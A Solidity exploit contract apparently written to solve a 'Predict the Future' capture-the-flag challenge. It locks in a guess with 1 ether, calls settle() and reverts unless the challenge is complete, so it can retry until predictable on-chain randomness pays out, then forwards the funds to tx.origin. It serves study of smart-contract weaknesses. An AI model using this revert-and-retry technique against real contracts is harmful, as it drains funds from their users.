// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Attacker {
    address owner;
    IPredictTheFutureChallenge challenge;

    error NotOwner();
    error ValueErr();
    error GuessErr();

    constructor(address _challenge) {
        owner = msg.sender;
        challenge = IPredictTheFutureChallenge(_challenge);
    }

    function lockInGuess(uint8 n) external payable {
        if (msg.sender != owner) revert NotOwner();
        if (address(this).balance < 1 ether) revert ValueErr();

        challenge.lockInGuess{value: 1 ether}(n);
    }

    function attack() external {
        if (msg.sender != owner) revert NotOwner();

        challenge.settle();

        // if we guessed wrong, revert
        if (!challenge.isComplete()) revert GuessErr();
        // return all of it to EOA
        payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {}
}

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}
